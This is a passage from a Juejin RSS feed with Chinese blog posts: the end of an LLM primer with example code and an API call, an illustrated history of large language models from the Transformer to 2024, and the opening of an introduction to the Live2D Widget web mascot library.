  <span class="hljs-keyword">const</span> left = arr.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x &lt; pivot);
  <span class="hljs-keyword">const</span> middle = arr.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x === pivot);
  <span class="hljs-keyword">const</span> right = arr.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x &gt; pivot);
  <span class="hljs-keyword">return</span> [...<span class="hljs-title function_">quickSort</span>(left), ...middle, ...<span class="hljs-title function_">quickSort</span>(right)];
}
</code></pre>
<p><strong>解析</strong>：LLM 从训练数据中学会了编程模式和算法逻辑，能够生成可运行的代码。</p>
<h3 data-id="heading-9">案例 3：发现 LLM 的局限性</h3>
<p><strong>测试 1：实时信息</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet">用户: <span class="hljs-string">"今天天气怎么样？"</span>
<span class="hljs-symbol">LLM:</span> <span class="hljs-string">"抱歉，我无法获取实时天气信息。"</span>
</code></pre>
<p><strong>测试 2：精确计算</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">用户: "12345 × 67890 = ？"</span>
<span class="hljs-section">LLM: "大约是 83,000,000 左右"</span>
<span class="hljs-section">实际: 838,102,050</span>
</code></pre>
<p><strong>测试 3：知识截止</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet">用户: <span class="hljs-string">"谁赢得了2024年奥运会？"</span>
<span class="hljs-symbol">LLM:</span> <span class="hljs-string">"抱歉，我的知识截止到2023年..."</span>
</code></pre>
<p><strong>解析</strong>：这些测试揭示了 LLM 的三大局限——知识截止、幻觉问题、无法访问实时信息。</p>
<h3 data-id="heading-10">案例 4：实际项目中的调用</h3>
<p>在本项目的后端代码中，LLM 调用是这样实现的：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">async</span> <span class="hljs-title function_">chat</span>(<span class="hljs-params">request: {
  question: <span class="hljs-built_in">string</span>;    // 用户的问题
  model: <span class="hljs-built_in">string</span>;       // 使用的模型（如 qwen-plus）
  apiKey: <span class="hljs-built_in">string</span>;      // API 密钥
}</span>) {
  <span class="hljs-comment">// 调用阿里云百炼的 LLM</span>
  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(
    <span class="hljs-string">'https://dashscope.aliyuncs.com/compatible-mode/v1/chat/completions'</span>,
    {
      <span class="hljs-attr">model</span>: request.<span class="hljs-property">model</span>,
      <span class="hljs-attr">messages</span>: [{ <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: request.<span class="hljs-property">question</span> }]
    }
  );

  <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>].<span class="hljs-property">message</span>.<span class="hljs-property">content</span>;
}
</code></pre>
<p><strong>解析</strong>：通过 HTTP API 调用，将用户问题发送给 LLM，获取生成的回复。</p>
<hr/>
<h2 data-id="heading-11">总结</h2>
<ol>
<li><strong>LLM 是文字接龙机器</strong>——核心原理是预测下一个词</li>
<li><strong>LLM 有强大但有限的能力</strong>——理解、生成、推理、学习都很强，但并非万能</li>
<li><strong>LLM 的知识来自训练数据</strong>——它学习的是模式和规律，而非简单记忆</li>
<li><strong>LLM 会犯错</strong>——幻觉、知识截止、计算不精确是常见问题</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[大模型发展史-01]]></title>    <link>https://juejin.cn/post/7600986252449234984</link>    <guid>https://juejin.cn/post/7600986252449234984</guid>    <pubDate>2026-01-30T15:01:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600986252449234984" data-draft-id="7600799940971724840" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="大模型发展史-01"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-30T15:01:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一诺滚雪球"/> <meta itemprop="url" content="https://juejin.cn/user/2824015112318094"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            大模型发展史-01
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2824015112318094/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一诺滚雪球
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T15:01:41.000Z" title="Fri Jan 30 2026 15:01:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>2017年，一篇论文悄然发表，题为《Attention Is All You Need》。</p>
<p>当时没人预料到，这篇论文中提出的 Transformer 架构，会在短短几年内彻底改变人工智能的格局。</p>
<p>五年后的2022年11月30日，ChatGPT 发布。五天内，用户突破100万。两个月内，用户突破1亿。</p>
<p>这是互联网历史上增长最快的应用，也是人工智能发展史上的重要里程碑。</p>
<p>从默默无闻到席卷全球，大语言模型经历了怎样的进化之路？让我们一起回顾这段激动人心的技术演进史。</p>
<hr/>
<h2 data-id="heading-1">1. 什么是 Transformer</h2>
<p><strong>Transformer</strong> 是一种完全基于注意力机制的神经网络架构，于2017年由 Google 团队提出。</p>
<h3 data-id="heading-2">核心创新</h3>





















<table><thead><tr><th>特点</th><th>说明</th></tr></thead><tbody><tr><td><strong>Self-Attention</strong></td><td>自注意力机制，捕捉长距离依赖</td></tr><tr><td><strong>并行计算</strong></td><td>可并行训练，大幅提升效率</td></tr><tr><td><strong>可扩展性</strong></td><td>为后续大模型奠定基础</td></tr></tbody></table>
<h3 data-id="heading-3">核心思想</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Transformer 的核心：Self-Attention</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Transformer</span> {
  <span class="hljs-title function_">attention</span>(<span class="hljs-params">Q, K, V</span>) {
    <span class="hljs-comment">// Q (Query)、K (Key)、V (Value)</span>
    <span class="hljs-keyword">const</span> scores = Q @ K.<span class="hljs-property">T</span> / <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(d_k);  <span class="hljs-comment">// 计算注意力分数</span>
    <span class="hljs-keyword">const</span> weights = <span class="hljs-title function_">softmax</span>(scores);           <span class="hljs-comment">// 归一化</span>
    <span class="hljs-keyword">return</span> weights @ V;                        <span class="hljs-comment">// 加权求和</span>
  }
}
</code></pre>
<h3 data-id="heading-4">重要术语</h3>

























<table><thead><tr><th>术语</th><th>解释</th></tr></thead><tbody><tr><td><strong>预训练</strong></td><td>用大量无标注数据训练基础模型</td></tr><tr><td><strong>微调</strong></td><td>针对特定任务用小数据集优化模型</td></tr><tr><td><strong>RLHF</strong></td><td>人类反馈强化学习，对齐人类偏好</td></tr><tr><td><strong>少样本学习</strong></td><td>只需几个例子就能学会新任务</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-5">2. 案例</h2>
<h3 data-id="heading-6">案例 1：GPT 系列的进化之路</h3>
<p>让我们看看 GPT 系列是如何一步步进化的：</p>















































<table><thead><tr><th>代际</th><th>发布时间</th><th>参数量</th><th>能力突破</th></tr></thead><tbody><tr><td>GPT-1</td><td>2018.06</td><td>117M</td><td>预训练范式</td></tr><tr><td>GPT-2</td><td>2019.02</td><td>1.5B</td><td>零样本生成</td></tr><tr><td>GPT-3</td><td>2020.05</td><td>175B</td><td>少样本学习</td></tr><tr><td>GPT-3.5</td><td>2022.11</td><td>未知</td><td>对话能力</td></tr><tr><td>GPT-4</td><td>2023.03</td><td>~1.7T</td><td>多模态+推理</td></tr><tr><td>GPT-4o</td><td>2024.05</td><td>未知</td><td>原生多模态</td></tr></tbody></table>
<p><strong>关键突破：GPT-3 的少样本学习</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> prompt = <span class="hljs-string">`
翻译以下句子成中文：
Example 1: Hello world -&gt; 你好世界
Example 2: How are you -&gt; 你好吗
Input: Good morning -&gt; ?
`</span>;
<span class="hljs-comment">// GPT-3: 早上好</span>
<span class="hljs-comment">// 没有专门训练，就能学会翻译任务</span>
</code></pre>
<h3 data-id="heading-7">案例 2：ChatGPT 的 AI iPhone 时刻</h3>
<p><strong>发布时间</strong>：2022年11月30日</p>
<p><strong>突破性改进</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown">训练流程：
<span class="hljs-bullet">1.</span> 预训练（学习知识）
   ↓
<span class="hljs-bullet">2.</span> 有监督微调（学习指令）
   ↓
<span class="hljs-bullet">3.</span> 奖奖模型（学习人类偏好）
   ↓
<span class="hljs-bullet">4.</span> 强化学习（优化输出）
</code></pre>
<p><strong>成果</strong>：</p>
<ul>
<li>对话能力大幅提升</li>
<li>指令遵循能力强</li>
<li>多轮对话流畅</li>
<li>5天用户破100万</li>
</ul>
<h3 data-id="heading-8">案例 3：2023年百花齐放</h3>
<p><strong>闭源模型三强鼎立</strong>：</p>

























<table><thead><tr><th>模型</th><th>公司</th><th>核心优势</th></tr></thead><tbody><tr><td>GPT-4</td><td>OpenAI</td><td>多模态、推理能力强</td></tr><tr><td>Claude 3</td><td>Anthropic</td><td>超长上下文(200K)</td></tr><tr><td>Gemini</td><td>Google</td><td>原生多模态</td></tr></tbody></table>
<p><strong>开源模型快速追赶</strong>：</p>





























<table><thead><tr><th>模型</th><th>组织</th><th>参数</th><th>特点</th></tr></thead><tbody><tr><td>Llama 3</td><td>Meta</td><td>8B/70B</td><td>性能强劲</td></tr><tr><td>Qwen</td><td>阿里云</td><td>7B/14B/72B</td><td>中文优秀</td></tr><tr><td>Mistral</td><td>Mistral AI</td><td>7B</td><td>效率之王</td></tr></tbody></table>
<p><strong>中国大模型崛起</strong>：</p>






























<table><thead><tr><th>模型</th><th>公司</th><th>特色</th></tr></thead><tbody><tr><td>文心一言</td><td>百度</td><td>知识图谱增强</td></tr><tr><td>通义千问</td><td>阿里云</td><td>开源友好</td></tr><tr><td>讯飞星火</td><td>科大讯飞</td><td>语音能力强</td></tr><tr><td>DeepSeek</td><td>幻方量化</td><td>性价比高</td></tr></tbody></table>
<h3 data-id="heading-9">案例 4：2024年的三大趋势</h3>
<p><strong>趋势1：开源模型追平闭源</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-number">2024</span><span class="hljs-string">年初：Llama</span> <span class="hljs-number">2</span> <span class="hljs-string">70B</span> <span class="hljs-string">≈</span> <span class="hljs-string">GPT-3.5</span>
<span class="hljs-number">2024</span><span class="hljs-string">年中：Llama</span> <span class="hljs-number">3</span> <span class="hljs-string">70B</span> <span class="hljs-string">接近</span> <span class="hljs-string">GPT-4</span>
<span class="hljs-number">2024</span><span class="hljs-string">年底：Qwen</span> <span class="hljs-number">2.5</span><span class="hljs-string">、DeepSeek</span> <span class="hljs-string">V3</span> <span class="hljs-string">追平闭源</span>
</code></pre>
<p><strong>趋势2：多模态成为标配</strong></p>
<ul>
<li>GPT-4o：原生多模态</li>
<li>Claude 3.5：强大的视觉能力</li>
<li>Gemini：从一开始就是多模态</li>
</ul>
<p><strong>趋势3：智能体技术成熟</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Agent 能力的进化</span>
<span class="hljs-number">2022</span>：简单对话
<span class="hljs-number">2023</span>：工具调用
<span class="hljs-number">2024</span>：
  ├── 复杂任务规划
  ├── 多智能体协作
  ├── 自主学习和改进
  └── 真正的<span class="hljs-string">"AI 员工"</span>
</code></pre>
<hr/>
<h2 data-id="heading-10">总结</h2>
<ol>
<li><strong>规模即质量</strong>——更大的模型通常表现更好</li>
<li><strong>数据是关键</strong>——高质量训练数据至关重要</li>
<li><strong>架构创新</strong>——Transformer 是核心突破</li>
<li><strong>开源加速</strong>——开源模型推动技术普及</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[为网页注入灵魂：Live2D Widget看板娘，打造会动的互动伙伴！]]></title>    <link>https://juejin.cn/post/7601169987395174451</link>    <guid>https://juejin.cn/post/7601169987395174451</guid>    <pubDate>2026-01-30T15:01:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601169987395174451" data-draft-id="7600953879501226035" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="为网页注入灵魂：Live2D Widget看板娘，打造会动的互动伙伴！"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-30T15:01:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="修己xj"/> <meta itemprop="url" content="https://juejin.cn/user/2641475936724142"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            为网页注入灵魂：Live2D Widget看板娘，打造会动的互动伙伴！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2641475936724142/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    修己xj
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T15:01:41.000Z" title="Fri Jan 30 2026 15:01:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>厌倦了静态网页的冰冷与单调？Live2D Widget 能将一个生动、可爱的看板娘轻松带入你的网站。只需一行代码，这个由 TypeScript 驱动的开源项目即可为博客、个人主页或任何网页赋予灵动的生命。她不仅会眨眼、转头，还能与访客进行简单的互动，瞬间提升网站的趣味性与亲和力。无论是技术极客追求的可定制性，还是普通用户向往的轻松集成，Live2D Widget 都能满足。跟随本文，一分钟唤醒你的网页，让数字世界多一位温暖陪伴。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd576edbe3ad41b1936bf7d5f7597118~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=S2GWwDDWOBKxw5BHsbPTxmr6mKM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">🎯项目介绍</h2>
<ul>
<li>• <strong>页面互动</strong>：在网页中添加 Live2D 看板娘</li>
<li>• <strong>易于集成</strong>： 核心代码由 TypeScript 编写，易于集成，只需一行代码，即可为网站添加看板娘</li>
<li>• <strong>轻量级设计</strong>：除Live2D核心库外无额外依赖，加载迅速</li>
<li>• <strong>高度可定制</strong>：支持多种配置选项，完美适配你的网站风格</li>
</ul>
<p>github地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fstevenjoezhang%2Flive2d-widget%2F" title="https://github.com/stevenjoezhang/live2d-widget/" target="_blank" ref="nofollow noopener noreferrer">github.com/stevenjoezh…</a></p>
<p>官网地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.live2d.com%2Fen%2F" title="https://www.live2d.com/en/" target="_blank" ref="nofollow noopener noreferrer">www.live2d.com/en</a></p>
<p>该项目目前在github上已有 <strong>10.4k</strong> ⭐️ star</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56226e3cc71d4a5a9cce847368a88ce8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=HgYpHhaZIZ0%2FfGufjdRGh5HevKc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">⚡快速开始：一分钟集成</h2>
<p>对于大多数用户来说，集成过程简单得令人惊喜：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 只需在页面中添加这行代码 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://fastly.jsdelivr.net/npm/live2d-widgets@1.0.0/dist/autoload.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>我的博客页面 <a href="https://link.juejin.cn?target=https%3A%2F%2Fxiuji008.github.io%2F" title="https://xiuji008.github.io/" target="_blank" ref="nofollow noopener noreferrer">xiuji008.github.io/</a> 已经集成了，家人们可以移步过去看看效果，以下是一些效果图</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d63dcb3ef48413aabc0193f150e9f58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=d3P9XCVGoCsNmrV3NsKGmYtwuRw%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17cf9f6e9ca848b49f05292f6bb2dbcc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=UTcCSB4AvxQ7rPlmuAc7puEUdKQ%3D" alt="" loading="lazy"/></p>
